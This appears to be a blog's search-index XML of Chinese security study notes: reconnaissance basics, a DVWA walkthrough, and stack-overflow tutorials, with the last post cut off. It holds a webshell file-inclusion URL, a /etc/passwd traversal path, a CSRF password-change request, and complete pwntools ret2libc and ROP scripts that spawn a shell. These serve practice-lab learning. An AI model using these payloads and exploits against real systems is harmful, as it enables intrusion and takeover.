<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>网站渗透测试原理及详细过程</title>
      <link href="/2019/04/16/wang-zhan-shen-tou-ce-shi-yuan-li-ji-xiang-xi-guo-cheng/"/>
      <url>/2019/04/16/wang-zhan-shen-tou-ce-shi-yuan-li-ji-xiang-xi-guo-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="此处省略了原文的’零’，’一’，’二’，有兴趣的可以点文章最下面的原文链接查看，本文仅作为纯技术方面的个人总结。"><a href="#此处省略了原文的’零’，’一’，’二’，有兴趣的可以点文章最下面的原文链接查看，本文仅作为纯技术方面的个人总结。" class="headerlink" title="此处省略了原文的’零’，’一’，’二’，有兴趣的可以点文章最下面的原文链接查看，本文仅作为纯技术方面的个人总结。"></a>此处省略了原文的’零’，’一’，’二’，有兴趣的可以点文章最下面的原文链接查看，本文仅作为纯技术方面的个人总结。</h2><h2 id="一、信息收集（历来测试第一条，铁打的信息收集）"><a href="#一、信息收集（历来测试第一条，铁打的信息收集）" class="headerlink" title="一、信息收集（历来测试第一条，铁打的信息收集）"></a>一、信息收集（历来测试第一条，铁打的信息收集）</h2><h4 id="1-网络-公开-信息收集"><a href="#1-网络-公开-信息收集" class="headerlink" title="1.网络(公开)信息收集"></a>1.网络(公开)信息收集</h4><p>直接进行网络扫描不是这一步要干的事，循序渐进才对。先找一些公开的，个人认为会包含类似于“社工”的东西。详细的说，有google hacking（百度也行，意在大量获取周边的有用信息），whois查询，dns等。如果考虑进行社会工程学的话，这里还可以相应从邮件列表/新闻组中获取目标系统中一些边缘信息如内部员工帐号组成，身份识别方式，邮件联系地址等。</p><p>(1)使用whois查询目标域名的DNS服务器<br>(2)nslookup   [nslookup用于查询DNS的记录，查询域名解析是否正常]<br>>set type=all<br>>&lt;domain><br>>server &lt; ns server><br>>set q=all<br>>ls -d &lt;domain><br>涉及的工具包括：Google,<a href="http://www.nosec.org/web/index.php?q=demon" target="_blank" rel="noopener">Demon</a>,<a href="http://www.webhosting.info/" target="_blank" rel="noopener">webhosting.info</a>,<a href="http://worm.ccert.edu.cn/GoogleHacking/Apollo/" target="_blank" rel="noopener">Apollo</a>,<a href="http://snakeoillabs.com/" target="_blank" rel="noopener">Athena</a>,<a href="http://snakeoillabs.com/downloads/GHDB.xml" target="_blank" rel="noopener">GHDB.XML</a>,<a href="http://uptime.netcraft.com/up/graph" target="_blank" rel="noopener">netcraft</a>,<a href="http://www.seologs.com/ip-domains.html" target="_blank" rel="noopener">seologs</a>。<br>(3)搜索引擎的常用语法<br>   <code>site</code>:用于搜索指定的站点关键字。比如<code>site:www.nosec.org</code>，比如用<code>site:nosec.org</code>搜索该域名下的所有子域名的页面，比如用<code>site:org.cn</code>搜索中国政府部门的网站。</p><h4 id="2-目标系统信息收集（目前不太懂。。。）"><a href="#2-目标系统信息收集（目前不太懂。。。）" class="headerlink" title="2.目标系统信息收集（目前不太懂。。。）"></a>2.目标系统信息收集（目前不太懂。。。）</h4><p>通过上面一步，我们应当可以简单的描绘出目标系统的网络结构，如公司网络所在区域，子公司IP地址分布，VPN接入地址等。这里特别要注意一些比较偏门的HOST名称地址，如一些<code>backup</code>开头或者<code>temp</code>开关的域名很可能就是一台备份服务器，其安全性很可能做的不够。<br>从获取的地址列表中进行系统判断，了解其组织架构及操作系统使用情况。最常用的方法的是目标所有IP网段扫描。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我自己关于安全的一点想法(持续更新)</title>
      <link href="/2019/04/14/wo-zi-ji-guan-yu-an-quan-de-yi-dian-xiang-fa-chi-xu-geng-xin/"/>
      <url>/2019/04/14/wo-zi-ji-guan-yu-an-quan-de-yi-dian-xiang-fa-chi-xu-geng-xin/</url>
      
        <content type="html"><![CDATA[<a id="more"></a>        <p>1.好像是道哥在《白帽子……（最经典那本）》里说的，安全的前提是信任。没有绝对的安全，一切的安全都建立在信任的基础上，比如我们信任使用账号的正是他本人，然后我们把信息给他看，如果这个信任条件不成立，那就不是安全的。</p><p>2.我们的Urahara大哥说的，在我们刚学sqli的时候，他说大多数漏洞的本质就是能操控用户自己能修改的东西，比如XSS，SQLi就是通过拼接或者什么的，我们通过改变自己所能改变操控的东西对内部，后台，产生了不愿意见到或是意料之外的影响。</p><p>3.我们的WeaponX大哥说的，漏洞这种东西发现了不重要，重要的是可不可以利用，二进制安全方面的漏洞，能否影响程序走向，进程，才是重要的。</p><p>4.要做个有目标有理想的人，时刻不忘初心，为了你的目标而努力奋斗。<br><em>来源：<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8697647.html" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/8697647.html</a></em></p><p>5.不因喜悦迷失自我，不因挫折丧失斗志。<br><em>来源：<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8697647.html" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/8697647.html</a></em></p><p>5.最近感觉很迷茫啊，被二进制搞得没啥信心了。。。可能是真的基础很差加上动手能力不行吧！想当初我最开始的目标是啥，是黑掉所有的小黄网，真的不是什么很伟大的理想。<br><strong>那所谓目标和理想，初心是啥呢？</strong><br>是啥呢。。。还没想出来，也许需要一点专业的心理指导，留个印，想好了写。</p>]]></content>
      
      
      <categories>
          
          <category> 杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人感悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA学习(low)</title>
      <link href="/2019/04/14/dvwa-xue-xi-low/"/>
      <url>/2019/04/14/dvwa-xue-xi-low/</url>
      
        <content type="html"><![CDATA[<a id="more"></a>        <h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>暴力破解，很简单，burp加载一下常用的用户名密码字典，跑就完了。</p><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>命令注入，根据我这篇文章的第二条<a href="https://windq08.github.io/2019/04/14/wo-zi-ji-guan-yu-an-quan-de-yi-dian-xiang-fa-chi-xu-geng-xin/" title="我自己对安全的一点想法">（我就是“这篇文章”）</a>，其实命令注入，就是在一个注入点正常所允许的服务范围之外加点额外的东西。比如本题，提示是<code>Enter an IP address:</code>，我们输入一个IP后发现其实是执行了<code>ping</code>命令的回显，那么首先想到的是在完成<code>ping</code>的指令后我们还可以通过命令拼接让它再执行一些别的命令。<br><img src="/2019/04/14/dvwa-xue-xi-low/1.png" alt="命令注入"><br><strong>然后，让我们来学习一下常见的命令拼接的手段！！！！我研究好半天呢！！！</strong></p><h3 id><a href="#" class="headerlink" title="|"></a><code>|</code></h3><p>管道命令<br>例：<code>dir . /s/a | find /c &quot;.exe&quot;</code> 先执行<code>dir</code>命令，然后对输出结果（<code>stdout</code>）执行<code>find</code>命令（输出当前文件夹及所有子文件夹里的.exe文件的个数）。</p><h3 id="-1"><a href="#-1" class="headerlink" title="||"></a><code>||</code></h3><p>顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令。</p><h3 id="amp"><a href="#amp" class="headerlink" title="&amp; / ;"></a><code>&amp; / ;</code></h3><p>bat中是使用<code>&amp;</code>,bash中使用<code>;</code><br>表示简单的拼接，前后命令语句没有制约关系。</p><h3 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a><code>&amp;&amp;</code></h3><p>先执行前面的命令，后执行后执行后面的命令。</p><p><em>注：记得在符号两侧加上空格。</em></p><p>看完了这个，low级别的命令注入就很简单了，简单的命令拼接就可以搞定。</p><p>附：<a href="https://www.cnblogs.com/accumulater/p/7110811.html" target="_blank" rel="noopener">Windows常用命令大全</a></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF是啥呢，简而言之就是用另一个人的身份做不应该自己做的事情。比如有一个用户S，我用自己的账号找到了一个网站上修改个人信息的链接，我截住这个发出请求的数据包，改变其中的某些参数，比如把自己的ID改成用户S的ID，诸如此类，然后把这个数据包在Burp中封成CSRF用链接，再把这个链接发给用户S，他若点开了，就是用他的身份做了这件事。</p><p>专业解释（上面的是领会精神）：<code>CSRF</code>，全称<code>Cross-site request forgery</code>，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。在2013年发布的新版OWASP Top 10中，CSRF排名第8。</p><p>然后让我们来看一下这道题<br><img src="/2019/04/14/dvwa-xue-xi-low/2.png" alt="CSRF"><br>很简单，输入密码，确认密码，就可以完成了，没有做任何防护。我们来看一下数据包。<br><img src="/2019/04/14/dvwa-xue-xi-low/3.png" alt="CSRF"><br>可以看出来这个请求的地址是</p><pre class=" language-bash"><code class="language-bash">GET /DVWA-master/vulnerabilities/csrf/?password_new<span class="token operator">=</span>123123<span class="token operator">&amp;</span>password_conf<span class="token operator">=</span>123123<span class="token operator">&amp;</span>Change<span class="token operator">=</span>Change HTTP/1.1</code></pre><p>谁要是点了这个，密码就会被改成123123了（当然是在理想情况下）。</p><h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p>文件包含，远程包含的话要把配置文件里<code>allow_url_include</code>，<code>allow_url_fopen</code>参数要设置成<code>On</code>。运气好的话可以执行包含后的代码，php漏洞居多。<br>有以下函数，且参数（文件）是可控的，就可以操作</p><blockquote><p>include(如果找不到文件，会警告)<br>require(如果找不到文件，会报错)<br>include_once()<br>require_once()</p></blockquote><p>接下来我们看一下这道题<br><img src="/2019/04/14/dvwa-xue-xi-low/4.png" alt="文件包含_题"><br>给了三个文件…不重要，没有啥太重要的信息，我们来看一下url<br><img src="/2019/04/14/dvwa-xue-xi-low/5.png" alt="文件包含_url"><br>这个4是我改过的，正常的话只到3。（提一下，按理说page是执行，file是文件读取，即不能操作，只能读那种）<br>很明显我们没有看file4.php的权限，但我认为按理说file4是存在的，于是我改了参数，也确实成功了，存在文件4，且我们有权浏览它，如下图<br><img src="/2019/04/14/dvwa-xue-xi-low/6.png" alt="文件包含_file4.php"><br>文件包含比较常见的是和目录穿越用在一起，如果是执行漏洞，可以<code>http://192.168.80.140/fileincl/example1.php?page=http://192.168.80.140/upload/images/webshell.php?cmd=ls</code><br>如果是读取漏洞，可以<code>http://192.168.80.140/dirtrav/example1.php?file=../../../../../../../../etc/passwd</code></p><h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><p>文件上传，就是指网络攻击者上传了一个可执行的文件到服务器并执行，这里上传的文件可以是木马,病毒,恶意脚本或者WebShell等。我觉得最重要的有三个条件：</p><blockquote><p>1.就是真的能上传上去<br>2.上传文件之后能找到文件的位置和文件名<br>3.这个文件能被成功执行<br>没有这三个条件就难以利用。相对应的，如果能不让攻击者找到目标文件位置，或者重命名这个文件，再或者不给可执行权限，再再或者把上传的文件库和正常运行数据库，web应用程序的服务器分开，用两个服务器，就可以初步防住这个问题。<br><strong>下面我们来看一下这道题哈</strong><br><img src="/2019/04/14/dvwa-xue-xi-low/7.png" alt="文件上传_题"><br>这就是题了，看起来很简单，没有太多多余的东西。<br>这个界面是我已经上传完东西的界面，只选了一个txt文件而没有选可执行文件，是模拟人生4的作弊码==<br>可以看见上面还有路径，是一个相对路径，绝对路径的话可能就有点傻了。。。<br>现在的url是<code>http://127.0.0.1/DVWA-master/vulnerabilities/upload/#</code>，绝对路径是<code>../../hackable/uploads/SIMS4.txt</code>，简单地说，把这个路径填到原url后面就可以了。我还额外试了一下，没有太多的路径穿越，比如到根目录底下什么的（多几个../../../）。<br><img src="/2019/04/14/dvwa-xue-xi-low/8.png" alt="文件上传_成功"><br>这就是成功了，首先你能直接访问到它，那就是上去了，能不能执行那是另一回事了。<br><img src="/2019/04/14/dvwa-xue-xi-low/9.png" alt="文件上传_不知道起啥名"><br>直接访问是不能利用它的，如果是二进制文件，就会把文件内容回显屏幕，如果是可执行文件，就会下载。<br><img src="/2019/04/14/dvwa-xue-xi-low/10.png" alt="文件上传_正确利用_1"><br><img src="/2019/04/14/dvwa-xue-xi-low/11.png" alt="文件上传_正确利用_2"><br>以上为一般性的利用细节，一句话，中国菜刀连接，触发马，拿下shell。</p></blockquote><h2 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a>Insecure CAPTCHA</h2><p>机器有点小问题，略过略过。</p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="sql注入概述"><a href="#sql注入概述" class="headerlink" title="sql注入概述"></a>sql注入概述</h3><p>SQL注入，sql注入是什么呢，好久没看了，来复习一下。（指着复习完了去挖漏洞试试手呢）<br>有一种东西叫数据库，我们平常怎么从数据库里调数据出来呢，是通过一种叫sql语言的东西。sql作为一种解释型语言，在运行时是由一个运行时组件解释语言代码并执行其中包含的指令的语言。（这段话其实我也不太懂）我们平常输入的数据会放在表单里提交给服务器，然后和内置的sql语言合并成一句最终版，再提交给数据库，最后依这句最终版的sql语句从数据库里查询数据。这中间就有可操作的地方了，比如像命令，代码注入一样，拼接或是用别的手段，使其能完成我们想要完成的工作。<br>举个小例子：比如我们有一个数据库表，如下<br><img src="/2019/04/14/dvwa-xue-xi-low/表格1.png" alt="数据库表"><br>然后我们输入<br><code>SELECT * FROM Persons WHERE City=&#39;Beijing&#39;  #意思是从Persons表里获取city列里数据为beijing的内容</code><br>然后我们会得到这个<br><img src="/2019/04/14/dvwa-xue-xi-low/表格2.png" alt="数据库表_city_beijing"><br>这就是正常的sql语句运行的过程。<br><strong>那么sql注入的概念是啥呢？</strong><br>假如有一个网页，非常简单，如下：<br><img src="/2019/04/14/dvwa-xue-xi-low/SQL注入网页图.png" alt="示范网页"><br>我们输入<code>Beijing</code>，那么后台拼接的sql语句就是<code>SELECT * FROM Persons WHERE City=&#39;Beijing&#39;</code>，按理说这个网页仅允许我们查询和城市相关的内容，但如果我们想搞点小破坏（拖数据应该不算啥小破坏），我们在后面的语句加上一段<code>&#39;union select * from persons where lastname=&#39;Adams&#39;#</code>：<br>我们的输入：<code>Beijing&#39;union select * from persons where lastname=&#39;Adams&#39;#</code><br>拼接后变成：<code>SELECT * FROM Persons WHERE City=&#39;Beijing&#39; union select * from persons where lastname=&#39;Adams&#39;#</code><br>我们会得到：<br><img src="/2019/04/14/dvwa-xue-xi-low/表格3.png" alt="数据库表_注入成功"><br>这样就套出了数据库里其他的东西，也就是sql注入了。<br><em>注：星号表示“所有的”；<code>biejing</code>后面加<code>&#39;</code>（单引号）是为了闭合前面的单引号，继续我们的工作；<code>union</code>是拼接符，拼接前后两个语句；<code>#</code>是注释符，意义是把后面原有的sql语句全都注释掉，不干扰，不起冲突。另：一般sql大小写不敏感。</em></p><h3 id="重新回到题上"><a href="#重新回到题上" class="headerlink" title="重新回到题上"></a>重新回到题上</h3>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web环境练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出（三）</title>
      <link href="/2019/04/13/zhan-yi-chu-san/"/>
      <url>/2019/04/13/zhan-yi-chu-san/</url>
      
        <content type="html"><![CDATA[<a id="more"></a>        <h2 id="一、了解一下libc"><a href="#一、了解一下libc" class="headerlink" title="一、了解一下libc"></a>一、了解一下libc</h2><p>　　libc动态链接库中的函数被广泛使用，所以有大概率可以在内存中找到libc动态库。该库内包含了一些系统级的函数，比如<code>system()</code>，所以可以尝试用这些系统级的函数取得控制权。再比如，这样的参数有可能是需要参数的，比如我们调用<code>system()</code>打开<code>/bin/sh</code>（即<code>system(&quot;/bin/sh&quot;)</code>），就可以执行一个shell了，所以可操控的数据里也要考虑这些重要参数。<br>　　还有一种东西叫ASLR，即地址随机化。如果打开了这种保护机制，那么每次运行时动态库的起始地址都会发生变化，即无法确定库里那些函数的绝对地址（除非你是天选之子一蒙一蒙一个准。。。那兴许还有救）。我们复现都是在关闭了ASLR的条件下。可通过调试工具获取<code>system()</code>的地址，动态库在内存中的起始地址，函数相对于起始地址的偏移量和函数的绝对地址。</p><h2 id="二、看一下代码"><a href="#二、看一下代码" class="headerlink" title="二、看一下代码"></a>二、看一下代码</h2><h3 id="2-1-代码"><a href="#2-1-代码" class="headerlink" title="2.1 代码"></a>2.1 代码</h3><p><strong>源程序</strong></p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>s<span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>脚本</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./vul"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./vul"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>payload  <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">44</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"vul"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#再次执行vul，造成第二次缓冲区溢出</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>ret <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>read_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token keyword">print</span> hex<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>read_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>system_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>binsh_offset <span class="token operator">=</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>base <span class="token operator">=</span> read_addr <span class="token operator">-</span> read_offsetsystem_addr <span class="token operator">=</span> base <span class="token operator">+</span> system_offsetbinsh_addr <span class="token operator">=</span> base <span class="token operator">+</span> binsh_offsetpayload2  <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">44</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="2-2-过程"><a href="#2-2-过程" class="headerlink" title="2.2 过程"></a>2.2 过程</h3><h4 id="2-2-1-第一次"><a href="#2-2-1-第一次" class="headerlink" title="2.2.1 第一次"></a>2.2.1 第一次</h4><p>在libc中可以找到<code>system()</code>和<code>/bin/sh</code>的地址(其实是相对于动态库起始地址的偏移量），利用第一次缓冲区溢出泄露地址，<code>base + read_offset = read_addr</code>，可以得到<code>read_offset</code>（偏移量），然后找出<code>read_addr</code>的地址，即</p><pre class=" language-python"><code class="language-python">base <span class="token operator">=</span> read_addr <span class="token operator">-</span> read_offsetsystem_addr <span class="token operator">=</span> base <span class="token operator">+</span> system_offset</code></pre><h4 id="2-2-2-第二次"><a href="#2-2-2-第二次" class="headerlink" title="2.2.2 第二次"></a>2.2.2 第二次</h4><p>在第二次缓冲区溢出时，程序会新开一个<code>system</code>进程，且需要调用的参数<code>/bin/sh</code>在栈中。</p><pre><code>payload1：padding + address of write_plt + address of vul + address of parameter write()payload2：padding + address of system() + address of dead + address of /bin/sh</code></pre><h2 id="三、ROP技术-Return-Oriented-Programming"><a href="#三、ROP技术-Return-Oriented-Programming" class="headerlink" title="三、ROP技术( Return Oriented Programming )"></a>三、ROP技术( Return Oriented Programming )</h2><p>　　在64位程序中局部变量存储在栈中，函数的参数存储在寄存器中，无法通过代码来修改寄存器中的参数，但是可以通过指令去修改。</p><p>　　在内存中确定某段指令的地址，并用其覆盖返回地址。但是有时候目标函数在内存中无法找到特定的函数可以适配，这时需要在内存中寻找多个指令片段，拼凑处一系列操作。可以使用rp++来搜索以ret结尾的指令片段。</p><pre class=" language-bash"><code class="language-bash">rp++ -f vul64 -r 5</code></pre><p><img src="/2019/04/13/zhan-yi-chu-san/1.jpg" alt="参考示意图"></p><h3 id="3-1-代码"><a href="#3-1-代码" class="headerlink" title="3.1 代码"></a>3.1 代码</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./vul64"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./vul64"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc64.so.6"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = remote('127.0.0.1', 10001)</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span><span class="token number">0x0400623</span> <span class="token comment" spellcheck="true">#:pop rdi ; ret  ;  (1 found)</span>pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x00400621</span> <span class="token comment" spellcheck="true">#: pop rsi ; pop r15 ; ret  ;  (1 found)</span>payload  <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">40</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xFFFFFFFFFFFFFFFF</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"vul"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>ret <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>read_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>read_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>system_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>binsh_offset <span class="token operator">=</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>base <span class="token operator">=</span> read_addr <span class="token operator">-</span> read_offsetsystem_addr <span class="token operator">=</span> base <span class="token operator">+</span> system_offsetbinsh_addr <span class="token operator">=</span> base <span class="token operator">+</span> binsh_offsetpayload  <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">40</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>　　利用两次溢出来执行<code>system(&quot;/bin/sh&quot;)</code></p><p><em>参考：<a href="https://www.chongming.club/2019/03/09/Buffer-overflow/#more" target="_blank" rel="noopener">https://www.chongming.club/2019/03/09/Buffer-overflow/#more</a></em><br><em>P.S.啊我好疲惫先让我偷个懒等我有空我再往上填么么哒</em></p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出（二）</title>
      <link href="/2019/03/27/zhan-yi-chu-er/"/>
      <url>/2019/03/27/zhan-yi-chu-er/</url>
      
        <content type="html"><![CDATA[<h5 id="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。"><a href="#这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。" class="headerlink" title="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。"></a>这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。</h5><a id="more"></a><p>　　源程序代码如下：     </p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>　　